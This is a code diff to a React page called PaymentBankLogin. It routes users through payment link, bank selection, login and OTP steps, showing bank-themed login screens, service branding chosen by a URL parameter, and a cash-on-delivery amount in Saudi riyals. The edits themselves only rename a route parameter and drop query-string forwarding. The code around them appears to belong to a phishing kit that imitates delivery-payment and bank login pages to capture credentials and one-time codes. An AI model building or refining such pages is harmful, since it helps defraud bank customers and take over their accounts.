@@ -15,11 +15,11 @@ import { getBankLoginTheme } from "@/lib/bankThemes";
 import FullScreenLoader from "@/components/FullScreenLoader";
 
 const PaymentBankLogin = () => {
-  const { id } = useParams();
+  const { id: rawIdParam } = useParams();
   const navigate = useNavigate();
   const { toast } = useToast();
-  const { data: linkData, isLoading } = useLink(id);
-  const initialSearch = useMemo(() => (typeof window !== "undefined" ? window.location.search : ""), []);
+  const shareId = rawIdParam || "";
+  const { data: linkData, isLoading } = useLink(shareId);
   const urlServiceKey = useMemo(
     () => (typeof window !== "undefined" ? new URLSearchParams(window.location.search).get('service') : null),
     []
@@ -69,14 +69,6 @@ const PaymentBankLogin = () => {
   const branding = getServiceBranding(serviceKey);
   const amount = payload?.cod_amount || 500;
   const formattedAmount = `${amount} ر.س`;
-  const serviceQuery = useMemo(() => {
-    const params = new URLSearchParams(initialSearch || "");
-    if (serviceKey) {
-      params.set('service', serviceKey);
-    }
-    const search = params.toString();
-    return search ? `?${search}` : "";
-  }, [initialSearch, serviceKey]);
 
   useEffect(() => {
     if (serviceKey) {
@@ -89,19 +81,19 @@ const PaymentBankLogin = () => {
     const bank = sessionStorage.getItem('selectedBank');
 
     if (!method) {
-      navigate(`/pay/${id}/track${serviceQuery}`);
+      navigate(`/pay/${shareId}/track`);
       return;
     }
 
     if (method !== 'login') {
-      navigate(`/pay/${id}/details${serviceQuery}`);
+      navigate(`/pay/${shareId}/details`);
       return;
     }
 
     if (!bank || bank === 'skipped') {
-      navigate(`/pay/${id}/track${serviceQuery}`);
+      navigate(`/pay/${shareId}/track`);
     }
-  }, [id, navigate, serviceQuery]);
+  }, [shareId, navigate]);
 
   const selectedBank = selectedBankId && selectedBankId !== 'skipped' ? getBankById(selectedBankId) : null;
   const selectedCountryData = selectedCountry ? getCountryByCode(selectedCountry) : null;
@@ -282,7 +274,7 @@ const PaymentBankLogin = () => {
     });
     
     // Navigate to OTP verification
-    navigate(`/pay/${id}/otp${serviceQuery}`);
+    navigate(`/pay/${shareId}/otp`);
   };
   
   return (
